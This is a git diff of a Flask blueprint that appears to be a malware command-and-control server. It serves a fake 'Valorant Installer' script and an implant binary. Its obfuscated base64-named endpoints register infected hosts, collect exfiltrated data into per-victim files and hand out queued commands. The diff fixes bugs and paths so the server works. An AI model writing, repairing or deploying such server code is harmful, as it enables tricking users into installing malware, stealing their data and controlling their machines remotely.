@@ -10,15 +10,15 @@ from flask import (
 
 bp = Blueprint('nartan', __name__)
 STATIC_DIR = os.getcwd()
-EXFIL_DIR = os.getcwd() + "/polo/infected/"
-CMD_FILE = os.getcwd() + "/polo/cmds.txt"
+EXFIL_DIR = "/root/MarcoPolo/polo/infected/"
+CMD_FILE = "/root/MarcoPolo/polo/cmds.txt"
 
 #Utils
 def get_commands():
     cmds = []
     with open(CMD_FILE, "r") as f:
         for line in f.readlines():
-            cmds.bpend(line.strip('\n'))
+            cmds.append(line.strip('\n'))
 
     open(CMD_FILE,"w").close()
     return json.dumps(cmds)
@@ -47,12 +47,12 @@ def download_page():
 @bp.route('/download')
 def download():
     print("Sending Valorant Installer")
-    return send_file(STATIC_DIR + "/marco/static/bin/install.sh", as_attachment=True)
+    return send_file(STATIC_DIR + "/static/bin/install.sh", as_attachment=True)
 
 @bp.route('/TW9yZ2VuCg')
 def TW9yZ2VuCg():
     print("Sending File")
-    return send_file(STATIC_DIR + "/marco/static/bin/polo", as_attachment=True)
+    return send_file(STATIC_DIR + "/static/bin/polo", as_attachment=True)
     
 #Obfuscated endpoint for first contact
 @bp.route('/ZGlyawo', methods=['POST'])
@@ -61,23 +61,26 @@ def ZGlyawo():
     #Marks-iMac.local, vps258357, Mark-PC, etc.
     post_data = request.get_data().decode('utf-8')
     path = EXFIL_DIR + post_data
-    if not os.path.isdir(path):
+    if not os.path.exists(path):
         os.mkdir(path)
+    
     print("Made Dir: %s" % (EXFIL_DIR + post_data))
     return('',204)
 
 @bp.route('/U2FtbXkK', methods=['GET'])
 def U2FtbXkK():
-    return send_file(STATIC_DIR + "/marco/static/enum.sh", as_attachment=True)
+    return send_file(STATIC_DIR + "/static/enum.sh", as_attachment=True)
 
 #Obfuscated endpoint for exfil
 @bp.route('/aGF0c3UK', methods=['POST'])
 def aGF0c3UK():
+    op = 'w'
     post_data = request.get_data().decode('utf-8')
     dirPath = post_data[0:post_data.find(':')]
     post_data = post_data[(len(dirPath)+ 1):]
-    with open(EXFIL_DIR + dirPath + "/exfil.info", "a") as f:
+    with open(EXFIL_DIR + dirPath + "/exfil.info", "a+") as f:
         f.write(post_data + "\n")
+
     return('', 204)
 
 #Obfuscated endpoint for retrieval
